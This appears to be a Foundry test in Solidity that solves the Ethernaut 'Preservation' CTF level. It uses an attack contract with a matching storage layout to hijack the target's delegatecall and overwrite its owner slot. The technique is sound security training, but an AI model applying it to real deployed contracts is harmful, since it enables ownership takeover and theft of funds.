pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../src/ethernaut/core/Ethernaut.sol";
import "../../src/ethernaut/16-Preservation/PreservationFactory.sol";
import "../../src/ethernaut/16-Preservation/Preservation.sol";

contract Attack{
    address public tmp1;
    address public tmp2;
    address public owner;
    function setTime(uint256 _time) public {
        //类型转换 time 为 address
        owner = address(uint160(_time));
    }
}


contract PreservationTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        //setup 
        ethernaut = new Ethernaut();
    }

    function testAttck() public {

        PreservationFactory factory = new PreservationFactory();
        ethernaut.registerLevel(factory);
        address levelAddress = ethernaut.createLevelInstance(factory);
        // slove the level
        Preservation preservation = Preservation(levelAddress);
        address owner = preservation.owner();
        console.log("owner: ", owner);
        Attack attack = new Attack();
        //设置攻击合约地址
        preservation.setFirstTime(uint256(uint160(address(attack))));
        // player address = address(this)
        preservation.setFirstTime(uint256(uint160(address(this))));
        console.log("After owner: ", preservation.owner());

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        assert(levelSuccessfullyPassed);
    }
}
